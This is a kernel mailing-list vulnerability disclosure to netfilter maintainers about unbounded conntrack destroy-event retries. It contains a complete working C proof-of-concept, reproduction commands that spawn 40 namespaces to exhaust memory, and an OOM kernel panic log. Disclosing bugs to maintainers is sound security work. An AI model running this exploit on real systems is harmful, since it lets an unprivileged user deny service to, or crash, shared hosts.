Received: from mail-pz2-f43.google.com (mail-pz2-f43.google.com [74.125.228.43])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A0E6C552952
	for <netfilter-devel@vger.kernel.org>; Tue, 22 Sep 2026 17:40:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.43
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790098827; cv=none; b=XqD+AtSQFmVqZ17HA4Y4IJLkH5rFahfvf76dIdaeFvwio5dFzkhrs5ABn/K7dkgbfKE/aRDHF5AMtdw5wIBIf8YUYx4bmRYOKs0/NqZhZ9+6JynJMigOR7+h/k33bb/rpySzyBEi11mxCLHA6QwsYD5FBdudH9gt/Z6mNXHHxo8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790098827; c=relaxed/simple;
	bh=aNOG4P58Yw6aaSaI/yeZbfPedJXnPBqtSA3t5flc+QQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=LEQaE+jWVhkNDOat1TvZUgyrqbNpwPGiUaUK2HRSeWQdPidA1tvaUBYKaPhY8eUFTQfqR4Nl9y8SuEqxoZtuqUMu1NjhC8i1Xkkz5r4bMettZnPPZQ5jhUrHAtB2pe3W7CKUC2Hpt1YM8CLD0pWRYUqMk8aCb8tDAWbq6l/uVCM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XQWktku9; arc=none smtp.client-ip=74.125.228.43
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XQWktku9"
Received: by mail-pz2-f43.google.com with SMTP id d2e1a72fcca58-85469d249c6so140790b3a.1
        for <netfilter-devel@vger.kernel.org>; Tue, 22 Sep 2026 10:40:25 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790098825; x=1790703625; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=sCj+aQ3G1pquYmfINTrFzhQVBklw3K5SVcNILh+XJRE=;
        b=XQWktku97XBiQaTBovzTaBGyJ6yduBkKcALsW1kNnT86llETsxhVacNguKQE1lcK7w
         qPtjE+YslPtHZJQoTi/McHLZPONg7KYlDCd9nzQy83n67IC5qK+pQs9KO0Pg2w+p2a5V
         G+orwGAVQ7j/uWnnCFuUimo36Ag9wbsclyhhf5iqDSXF55FCg7lAYzK7joNQk9d5aepV
         8S0+vJNDTaMmhK6zsNiRiXKFh6xnXeucoii4a28bPonrY+IehppoCZ8nI0t/L16cCiHu
         n8XYkSc11AcoodnqHeUiqoHYpdNBSi0QXiVyPJ2Uw/3lPDGcmSwy2YVpzpSV9FpxVKPD
         7LIQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790098825; x=1790703625;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=sCj+aQ3G1pquYmfINTrFzhQVBklw3K5SVcNILh+XJRE=;
        b=vMrHiGr52HS26YT5oknulbWycecHMpy42qX7Htf3ukjG9bcx72Z95DyPdv4EV5D34l
         YVjeLWxiwrfhUq1YYdoc7ovGBd1flJKi0x9XWIP6nRQwEYZvCnbWJSGLhxDE/kEoGPtk
         vG1vbd/V05pDtA2V0I9seik2VOc9CoGwvOoqXeKtNplEZxRmrypeHxqVNYDUTf068yzy
         b3RMLNvjgTe0lzq0RubgxCP0PzEXeHbPeIvgAauwiq6iWnSS5neyIW0lIK9clAy/BlD2
         BakxZQWaqakrpg2kMyPw6EP+e0yoCmOlRHOfYZRpON+aN0RXDzpwnIfbzHef+bIgyiCo
         6DOQ==
X-Gm-Message-State: AFuF++m2ZvCkOrHMNNjy8tcoZw8BogekDuE+ivQG1lPks+JlCww8V79A
	7vrgKVfTa1K8rjeDKVIXWLtjBbkSVlq/0QULaab5DGsePgTamHcO9i/u+cZAdLTYqIInEBf3QJq
	1gIEqzUvW
X-Gm-Gg: AYBFou0VKJGDK6uYH68BcCJUYUiOFmsIyexPiAlFKoNJy6oEKltWk5sufOCBmQrMzmq
	X0GCr5TIO3bdvcExPQIPFldTw2g6qkwFQyh7ZEgY+DVOUv9+hqB7Kak5T2g9vmBfzThwZ7JttNY
	YRVUnVuKbxg2m0XIYBegzi1ELjyRAsRyCindgtPSWYuF0zPOQdEd6V16UFfoy1UnMYRsxWeQT64
	IUDpgy3MtxOs6uQvR+ngMu95TTcZ7gAZ9SFmIRDs7YB7CMAgnwWgaYn0RL88wNAJHsaCLcyViNu
	kx+R1puHU7KkixqiYcb72E7zJHJjIT+HXRVR3caFr+4T4HEp0pqULPSyKiF7G3sK6FPXDm3LROV
	JMRguCQFPhQtty0hzBMETM144/sQurdq/vd3SKpG0eTVsp5aPXkbjXVLixGlTSFxoXOrFuztkL/
	0pZifxCDZLHNWCOTtp1PRc165cWMkKWCI2IffgT3A9++i4SaXHLB8i5bwucuPhD5B15TNFEIOr1
	dBD3BCHbeeuG+pnrFY=
X-Received: by 2002:a05:6a00:3c86:b0:871:2152:980e with SMTP id d2e1a72fcca58-87d1abb5128mr295844b3a.23.1790098824544;
        Tue, 22 Sep 2026 10:40:24 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-87d1cfc0843sm147812b3a.12.2026.09.22.10.40.17
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 22 Sep 2026 10:40:23 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	vega@nebusec.ai,
	caoruide123@gmail.com,
	weir@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: ecache: bound destroy event redelivery
Date: Wed, 23 Sep 2026 01:39:55 +0800
Message-ID: <cover.1787158072.git.vega.cover-letter@nebusec.ai>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Ruide Cao <caoruide123@gmail.com>

Hi Linux kernel maintainers,

We found an issue in include/net/netfilter/nf_conntrack.h,
net/netfilter/nf_conntrack_ecache.c.

When destroy-event delivery returns an error, ecache_work_evict_list()
stops at that entry without releasing it or any later dying conntracks.
ecache_work() then retries after the fixed 10 ms ECACHE_RETRY_JIFFIES
interval, with no retry limit, backoff, or eventual drop policy. A
CAP_NET_ADMIN-capable process in its owning network namespace can subscribe
to conntrack multicast, enable NETLINK_BROADCAST_ERROR, fill the socket
receive queue, and stop reading. Every retry then rebuilds and broadcasts
the event only to receive another `-ENOBUFS`, while expired conntracks
remain charged and referenced. This can autonomously consume CPU, retain
conntracks up to the namespace limit, block new tracked connections, and
scale into host resource exhaustion across attacker-created namespaces or
numerous listener sockets.

Privilege model: a non-root user can trigger this by creating a
user+network namespace (e.g. `unshare -Urn`); CAP_NET_ADMIN is required
only inside that namespace to open the conntrack netlink destroy
listener and enable NETLINK_BROADCAST_ERROR. No capability in the
initial namespace is required. Root is used only for optional demos
such as setting vm.panic_on_oom.

Compatibility: nf_conntrack ecache only; no uAPI change.

Reproducer:

# `nf_conntrack_ecache` destroy-event congestion repro

## Result

The bug is present in this tree and is reachable from userspace.

- Level 2 trigger works as `test_user` via `unshare -Urn`.
- A single namespace can pin its conntracks at `nf_conntrack_max=65536`.
- With `vm.panic_on_oom=2` enabled by root and 40 concurrent Level 2 namespaces holding congested destroy listeners open, the guest panicked from OOM.

## Relevant config

Verified in `build/.config`:

- `CONFIG_NAMESPACES=y`
- `CONFIG_USER_NS=y`
- `CONFIG_NET_NS=y`
- `CONFIG_NETFILTER_NETLINK=y`
- `CONFIG_NF_CONNTRACK=y`
- `CONFIG_NF_CONNTRACK_EVENTS=y`
- `CONFIG_NF_CT_NETLINK=y`

Notes:

- `CONFIG_NF_CONNTRACK_PROCFS` is disabled, so the PoC uses the netlink `IPCTNL_MSG_CT_GET_DYING` dump instead of `/proc/net/nf_conntrack`.
- Runtime also allowed unprivileged user namespaces: `test_user` successfully ran `unshare -Urn`.

## Userspace trigger chains

### Chain 1: direct ctnetlink create + flush

- Userspace entry: `NETLINK_NETFILTER` / `IPCTNL_MSG_CT_NEW`, `IPCTNL_MSG_CT_DELETE`, `IPCTNL_MSG_CT_GET_DYING`.
- Required setup: subscribe a netlink socket to `NFNLGRP_CONNTRACK_DESTROY`, set `NETLINK_BROADCAST_ERROR`, shrink `SO_RCVBUF`, and stop reading.
- Target path: `ctnetlink_new_conntrack()` -> `nf_ct_ecache_ext_add()` allocates ecache state because a listener exists; `ctnetlink_del_conntrack()` / `ctnetlink_flush_conntrack()` -> `nf_ct_delete()` -> `nf_conntrack_event_report(IPCT_DESTROY, ...)`.
- Vulnerable condition: `ctnetlink_conntrack_event()` returns `-ENOBUFS` when the destroy multicast hits the congested listener.
- Expected effect: `nf_ct_delete()` moves the conntrack to `dying_list`; `ecache_work_evict_list()` stops at the first failed entry and leaves that entry plus all later entries pinned; `ecache_work()` retries every 10 ms forever.
- Observable signals: `nf_conntrack_count` stays elevated after flush; `IPCTNL_MSG_CT_GET_DYING` returns the stuck entries; repeated rounds pin the namespace at `nf_conntrack_max`.

This is the most reliable path and is what `poc.c` uses.

### Chain 2: real traffic + conntrack flush

- Userspace entry: ordinary packet traffic creates tracked flows; `conntrack -F` or a netlink delete flush removes them.
- Required setup: same congested destroy listener as Chain 1; conntrack must actually be active for the traffic path.
- Target path: traffic-created entries later reach `nf_ct_delete()` via flush.
- Vulnerable condition / effect / signals: same as Chain 1.

This is viable but less self-contained because it depends on packet-tracking setup.

### Chain 3: real traffic + timeout expiry

- Userspace entry: ordinary traffic creates tracked flows, then userspace waits for timeout expiry.
- Required setup: same congested destroy listener; protocol/timeouts must be chosen so expirations happen in a reasonable window.
- Target path: timeout-driven deletion eventually calls `nf_ct_delete()`.
- Vulnerable condition / effect / signals: same as Chain 1.

This also works in theory but is slower and noisier than direct netlink insertion/deletion.

## Root cause

`net/netfilter/nf_conntrack_ecache.c` has two coupled problems:

1. `ecache_work_evict_list()` breaks on the first failed destroy-event delivery:

   - `nf_conntrack_event(IPCT_DESTROY, ct)` returning non-zero sets `STATE_CONGESTED`.
   - The failing entry is left on `dying_list`.
   - Later dying entries are also left pinned behind it.
   - None of those conntracks reach `nf_ct_put()`.

2. `ecache_work()` retries forever with a fixed interval:

   - `STATE_CONGESTED` always schedules `ECACHE_RETRY_JIFFIES`, which is 10 ms.
   - There is no backoff, retry cap, or drop policy.

With a subscribed destroy listener that enables `NETLINK_BROADCAST_ERROR`, fills its receive queue, and stops reading, every retry rebuilds and rebroadcasts the same destroy event, gets `-ENOBUFS` again, and keeps the namespace's dying conntracks charged and referenced.

An important detail for reproduction is that the listener must exist before creating the conntracks. With the default `nf_conntrack_events=2` autodetect mode, `nf_ct_ecache_ext_add()` only allocates ecache state for new conntracks when a conntrack event listener is already active.

Another important detail is that the listener must stay open. If the congested listener closes, later retries see no destroy listeners and the worker drains the dying list.

## PoC files

- `poc.c`: standalone raw-netlink PoC.
- `Makefile`: builds `poc`.

The PoC:

- opens a destroy-event listener with `NETLINK_BROADCAST_ERROR` and a tiny receive queue,
- creates synthetic UDP conntracks with `IPCTNL_MSG_CT_NEW`,
- flushes them with `IPCTNL_MSG_CT_DELETE`,
- dumps `IPCTNL_MSG_CT_GET_DYING`,
- optionally keeps the listener open so the leak persists.

## Reproduction

### 1. Build inside the guest

```sh
make
```

### 2. Level 2 proof that the bug is triggerable by an unprivileged user

Run as `test_user`:

```sh
unshare -Urn sh -c './poc -n 4096 -r 20 -s 1'
```

Observed output:

```text
after flush round 16: nf_conntrack_count=65530 dying=65530 max=65536
round 17: requested=4096 created=6
after flush round 17: nf_conntrack_count=65536 dying=65536 max=65536
table is pinned at nf_conntrack_max, stopping.
```

This shows that a pure Level 2 namespace trigger can pin the namespace at its conntrack limit.

### 3. Crash run used for `success`

Root enabled OOM panic:

```sh
sysctl -w vm.panic_on_oom=2
```

Then `test_user` launched 40 concurrent Level 2 namespaces, each keeping the congested listener open:

```sh
for i in $(seq 1 40); do
    unshare -Urn sh -c 'exec >/tmp/poc-$i.log 2>&1; ./poc -n 4096 -r 17 -s 1 -H 600' &
done
wait
```

Before the panic, slab usage grew as expected:

```text
nf_conntrack      2376649 2376656 ...
MemAvailable:      27796 kB
Slab:            2523968 kB
```

The guest then panicked:

```text
Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
CPU: 1 UID: 1028 PID: 12135 Comm: poc
```

The panic happened while a PoC thread was receiving a netlink dump, but the OOM condition was created by millions of retained conntracks that were pinned by the target bug across the concurrent namespaces.

## Privilege assessment

- Minimum trigger privilege: Level 2 / `namespace_required`.
- Evidence: `test_user` reproduced the bug with `unshare -Urn` and no initial-namespace capabilities.
- The crash run additionally used root to set `vm.panic_on_oom=2`, but the bug itself was already reachable and observable from Level 2.

## Miscellaneous observations

- An unrelated `EXT4-fs error` from `sftp-server` appeared earlier in the guest log during file transfer. It did not block the repro path.
- Closing the listener lets the worker drain the stuck dying list, so long-lived exhaustion requires keeping the congested listener alive.


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <linux/netlink.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef SOL_NETLINK
#define SOL_NETLINK 270
#endif

#define MAX_MSG_SIZE 4096

struct options {
	unsigned int batch;
	unsigned int rounds;
	unsigned int hold_secs;
	unsigned int final_hold_secs;
	unsigned int rcvbuf;
};

struct stats {
	unsigned long count;
	unsigned long dying;
	unsigned long max;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-n batch] [-r rounds] [-s hold_secs] [-H final_hold_secs] [-b rcvbuf]\n",
		prog);
}

static int bind_netlink_socket(int fd)
{
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};

	return bind(fd, (struct sockaddr *)&addr, sizeof(addr));
}

static struct nlattr *nlmsg_tail(const struct nlmsghdr *nlh)
{
	return (struct nlattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
}

static int add_attr(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		    const void *data, size_t len)
{
	size_t attr_len = NLA_HDRLEN + len;
	size_t total_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr_len);
	struct nlattr *nla;

	if (total_len > maxlen)
		return -1;

	nla = nlmsg_tail(nlh);
	nla->nla_type = type;
	nla->nla_len = attr_len;

	if (len > 0 && data != NULL)
		memcpy((char *)nla + NLA_HDRLEN, data, len);

	memset((char *)nla + NLA_ALIGN(attr_len), 0,
	       total_len - NLMSG_ALIGN(nlh->nlmsg_len) - NLA_ALIGN(attr_len));

	nlh->nlmsg_len = total_len;
	return 0;
}

static struct nlattr *start_nest(struct nlmsghdr *nlh, size_t maxlen,
				 uint16_t type)
{
	struct nlattr *nla = nlmsg_tail(nlh);

	if (add_attr(nlh, maxlen, type, NULL, 0) < 0)
		return NULL;

	return nla;
}

static void end_nest(struct nlmsghdr *nlh, struct nlattr *nest)
{
	nest->nla_len = (char *)nlmsg_tail(nlh) - (char *)nest;
}

static int send_netlink_message(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &addr,
		.msg_namelen = sizeof(addr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};

	return sendmsg(fd, &msg, 0);
}

static int recv_ack(int fd, uint32_t seq)
{
	char buf[MAX_MSG_SIZE];
	ssize_t len;

	for (;;) {
		struct nlmsghdr *nlh;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0)
			return -1;

		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			struct nlmsgerr *err;

			if (nlh->nlmsg_seq != seq)
				continue;

			if (nlh->nlmsg_type != NLMSG_ERROR)
				continue;

			err = (struct nlmsgerr *)NLMSG_DATA(nlh);
			if (err->error == 0)
				return 0;

			errno = -err->error;
			return -1;
		}
	}
}

static int send_request_and_wait_ack(int fd, struct nlmsghdr *nlh)
{
	if (send_netlink_message(fd, nlh) < 0)
		return -1;

	return recv_ack(fd, nlh->nlmsg_seq);
}

static unsigned long read_ulong_file(const char *path)
{
	FILE *fp;
	unsigned long value = 0;

	fp = fopen(path, "r");
	if (!fp)
		return 0;

	if (fscanf(fp, "%lu", &value) != 1)
		value = 0;

	fclose(fp);
	return value;
}

static void collect_stats(int fd, uint32_t *seq, struct stats *stats);

static int setup_listener(unsigned int rcvbuf)
{
	int fd;
	int one = 1;
	int group = NFNLGRP_CONNTRACK_DESTROY;
	socklen_t optlen;
	int actual = 0;

	fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);
	if (fd < 0) {
		perror("socket(listener)");
		return -1;
	}

	if (bind_netlink_socket(fd) < 0) {
		perror("bind(listener)");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
		perror("setsockopt(SO_RCVBUF)");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, SOL_NETLINK, NETLINK_BROADCAST_ERROR,
		       &one, sizeof(one)) < 0) {
		perror("setsockopt(NETLINK_BROADCAST_ERROR)");
		close(fd);
		return -1;
	}

	if (setsockopt(fd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP,
		       &group, sizeof(group)) < 0) {
		perror("setsockopt(NETLINK_ADD_MEMBERSHIP)");
		close(fd);
		return -1;
	}

	optlen = sizeof(actual);
	if (getsockopt(fd, SOL_SOCKET, SO_RCVBUF, &actual, &optlen) == 0)
		printf("listener ready: requested SO_RCVBUF=%u actual=%d\n",
		       rcvbuf, actual);

	return fd;
}

static void init_nfnl_msg(struct nlmsghdr *nlh, uint16_t type, uint16_t flags,
			  uint32_t seq, uint8_t family)
{
	struct nfgenmsg *nfg;

	memset(nlh, 0, MAX_MSG_SIZE);
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*nfg));
	nlh->nlmsg_type = (NFNL_SUBSYS_CTNETLINK << 8) | type;
	nlh->nlmsg_flags = flags;
	nlh->nlmsg_seq = seq;

	nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
	nfg->nfgen_family = family;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(0);
}

static int add_tuple(struct nlmsghdr *nlh, uint16_t tuple_type,
		     uint32_t src, uint32_t dst,
		     uint16_t sport, uint16_t dport)
{
	struct nlattr *tuple;
	struct nlattr *ip;
	struct nlattr *proto;
	uint8_t proto_num = IPPROTO_UDP;

	tuple = start_nest(nlh, MAX_MSG_SIZE, tuple_type);
	if (!tuple)
		return -1;

	ip = start_nest(nlh, MAX_MSG_SIZE, CTA_TUPLE_IP);
	if (!ip)
		return -1;
	if (add_attr(nlh, MAX_MSG_SIZE, CTA_IP_V4_SRC, &src, sizeof(src)) < 0 ||
	    add_attr(nlh, MAX_MSG_SIZE, CTA_IP_V4_DST, &dst, sizeof(dst)) < 0)
		return -1;
	end_nest(nlh, ip);

	proto = start_nest(nlh, MAX_MSG_SIZE, CTA_TUPLE_PROTO);
	if (!proto)
		return -1;
	if (add_attr(nlh, MAX_MSG_SIZE, CTA_PROTO_NUM,
		     &proto_num, sizeof(proto_num)) < 0 ||
	    add_attr(nlh, MAX_MSG_SIZE, CTA_PROTO_SRC_PORT,
		     &sport, sizeof(sport)) < 0 ||
	    add_attr(nlh, MAX_MSG_SIZE, CTA_PROTO_DST_PORT,
		     &dport, sizeof(dport)) < 0)
		return -1;
	end_nest(nlh, proto);

	end_nest(nlh, tuple);
	return 0;
}

static int create_one(int fd, uint32_t *seq, unsigned int id)
{
	char buf[MAX_MSG_SIZE];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	uint32_t orig_src = htonl(0x0a000001u + id);
	uint32_t orig_dst = htonl(0xc6336401u);
	uint16_t orig_sport = htons((uint16_t)(10000u + (id % 50000u)));
	uint16_t orig_dport = htons((uint16_t)(20000u + ((id / 50000u) % 2000u)));
	uint32_t timeout = htonl(600);

	init_nfnl_msg(nlh, IPCTNL_MSG_CT_NEW,
		      NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
		      ++(*seq), AF_INET);

	if (add_tuple(nlh, CTA_TUPLE_ORIG, orig_src, orig_dst,
		      orig_sport, orig_dport) < 0 ||
	    add_tuple(nlh, CTA_TUPLE_REPLY, orig_dst, orig_src,
		      orig_dport, orig_sport) < 0 ||
	    add_attr(nlh, MAX_MSG_SIZE, CTA_TIMEOUT,
		     &timeout, sizeof(timeout)) < 0) {
		errno = EMSGSIZE;
		return -1;
	}

	return send_request_and_wait_ack(fd, nlh);
}

static int flush_all(int fd, uint32_t *seq)
{
	char buf[MAX_MSG_SIZE];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;

	init_nfnl_msg(nlh, IPCTNL_MSG_CT_DELETE, NLM_F_REQUEST | NLM_F_ACK,
		      ++(*seq), AF_INET);

	return send_request_and_wait_ack(fd, nlh);
}

static unsigned long dump_dying_count(int fd, uint32_t *seq)
{
	char req[MAX_MSG_SIZE];
	char buf[16384];
	struct nlmsghdr *nlh = (struct nlmsghdr *)req;
	unsigned long count = 0;
	ssize_t len;
	uint32_t want_seq;

	init_nfnl_msg(nlh, IPCTNL_MSG_CT_GET_DYING, NLM_F_REQUEST | NLM_F_DUMP,
		      ++(*seq), AF_UNSPEC);
	want_seq = *seq;

	if (send_netlink_message(fd, nlh) < 0) {
		perror("send(GET_DYING)");
		return 0;
	}

	for (;;) {
		struct nlmsghdr *msg;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			perror("recv(GET_DYING)");
			return count;
		}

		for (msg = (struct nlmsghdr *)buf; NLMSG_OK(msg, len);
		     msg = NLMSG_NEXT(msg, len)) {
			if (msg->nlmsg_seq != want_seq)
				continue;

			if (msg->nlmsg_type == NLMSG_DONE)
				return count;

			if (msg->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err =
					(struct nlmsgerr *)NLMSG_DATA(msg);
				if (err->error != 0) {
					errno = -err->error;
					perror("dump(GET_DYING)");
				}
				return count;
			}

			count++;
		}
	}
}

static void collect_stats(int fd, uint32_t *seq, struct stats *stats)
{
	stats->count =
		read_ulong_file("/proc/sys/net/netfilter/nf_conntrack_count");
	stats->max = read_ulong_file("/proc/sys/net/netfilter/nf_conntrack_max");
	stats->dying = dump_dying_count(fd, seq);
}

static int create_batch(int fd, uint32_t *seq, unsigned int start,
			unsigned int count)
{
	unsigned int i;

	for (i = 0; i < count; i++) {
		if (create_one(fd, seq, start + i) < 0)
			return (int)i;
	}

	return (int)count;
}

static void print_stats(const char *tag, const struct stats *stats)
{
	printf("%s: nf_conntrack_count=%lu dying=%lu max=%lu\n",
	       tag, stats->count, stats->dying, stats->max);
}

int main(int argc, char **argv)
{
	struct options opts = {
		.batch = 2048,
		.rounds = 4,
		.hold_secs = 2,
		.final_hold_secs = 0,
		.rcvbuf = 4096,
	};
	struct stats stats;
	uint32_t seq = 0;
	unsigned int next_id = 0;
	int ctrl_fd = -1;
	int listener_fd = -1;
	unsigned int round;
	int opt;

	while ((opt = getopt(argc, argv, "n:r:s:H:b:h")) != -1) {
		switch (opt) {
		case 'n':
			opts.batch = strtoul(optarg, NULL, 0);
			break;
		case 'r':
			opts.rounds = strtoul(optarg, NULL, 0);
			break;
		case 's':
			opts.hold_secs = strtoul(optarg, NULL, 0);
			break;
		case 'H':
			opts.final_hold_secs = strtoul(optarg, NULL, 0);
			break;
		case 'b':
			opts.rcvbuf = strtoul(optarg, NULL, 0);
			break;
		case 'h':
		default:
			usage(argv[0]);
			return opt == 'h' ? 0 : 1;
		}
	}

	if (geteuid() != 0) {
		fprintf(stderr, "Run as root or as namespace-root inside a user+net namespace.\n");
		return 1;
	}

	listener_fd = setup_listener(opts.rcvbuf);
	if (listener_fd < 0)
		return 1;

	ctrl_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);
	if (ctrl_fd < 0) {
		perror("socket(control)");
		close(listener_fd);
		return 1;
	}

	if (bind_netlink_socket(ctrl_fd) < 0) {
		perror("bind(control)");
		close(ctrl_fd);
		close(listener_fd);
		return 1;
	}

	collect_stats(ctrl_fd, &seq, &stats);
	print_stats("baseline", &stats);

	for (round = 0; round < opts.rounds; round++) {
		int created;
		char tag[64];

		created = create_batch(ctrl_fd, &seq, next_id, opts.batch);
		printf("round %u: requested=%u created=%d\n",
		       round + 1, opts.batch, created);
		if (created <= 0)
			break;

		next_id += (unsigned int)created;
		collect_stats(ctrl_fd, &seq, &stats);
		snprintf(tag, sizeof(tag), "after create round %u", round + 1);
		print_stats(tag, &stats);

		if (flush_all(ctrl_fd, &seq) < 0) {
			perror("flush_all");
			break;
		}

		printf("round %u: flush sent, waiting %u second(s)\n",
		       round + 1, opts.hold_secs);
		sleep(opts.hold_secs);

		collect_stats(ctrl_fd, &seq, &stats);
		snprintf(tag, sizeof(tag), "after flush round %u", round + 1);
		print_stats(tag, &stats);

		if (stats.count >= stats.max) {
			printf("table is pinned at nf_conntrack_max, stopping.\n");
			break;
		}
	}

	if (opts.final_hold_secs > 0) {
		collect_stats(ctrl_fd, &seq, &stats);
		print_stats("final hold start", &stats);
		printf("holding listener open for %u second(s)\n",
		       opts.final_hold_secs);
		sleep(opts.final_hold_secs);
		collect_stats(ctrl_fd, &seq, &stats);
		print_stats("final hold end", &stats);
	}

	close(ctrl_fd);
	close(listener_fd);
	return 0;
}


------END PoC--------

----BEGIN crash log----

[ 1955.148681][T12135] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[ 1955.149527][T12135] CPU: 1 UID: 1028 PID: 12135 Comm: poc Not tainted 6.12.95 #2
[ 1955.150175][T12135] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1955.151257][T12135] Call Trace:
[ 1955.151536][T12135]  <TASK>
[ 1955.151738][T12135]  panic+0x533/0x610
[ 1955.152061][T12135]  ? __pfx_panic+0x10/0x10
[ 1955.152352][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.152786][T12135]  ? lockdep_hardirqs_on+0x7b/0x110
[ 1955.153274][T12135]  ? _raw_spin_unlock_irqrestore+0x40/0x80
[ 1955.153781][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.154322][T12135]  ? rcu_is_watching+0x12/0xc0
[ 1955.154747][T12135]  out_of_memory+0x73c/0x1430
[ 1955.155202][T12135]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 1955.155663][T12135]  ? __pfx_out_of_memory+0x10/0x10
[ 1955.156236][T12135]  ? lock_acquire+0x2f/0xb0
[ 1955.156564][T12135]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 1955.156964][T12135]  __alloc_pages_noprof+0x1ecc/0x26d0
[ 1955.157358][T12135]  ? trace_lock_acquire+0x145/0x1c0
[ 1955.157738][T12135]  ? __pfx___alloc_pages_noprof+0x10/0x10
[ 1955.158156][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.158704][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.159226][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.159730][T12135]  ? __pfx_mark_lock+0x10/0x10
[ 1955.160209][T12135]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1955.160686][T12135]  ? stack_trace_save+0x9a/0xd0
[ 1955.161153][T12135]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[ 1955.161641][T12135]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[ 1955.162064][T12135]  ? netlink_dump+0x17a/0xc20
[ 1955.162379][T12135]  ? netlink_recvmsg+0x973/0xd10
[ 1955.162707][T12135]  ? sock_recvmsg+0x14d/0x190
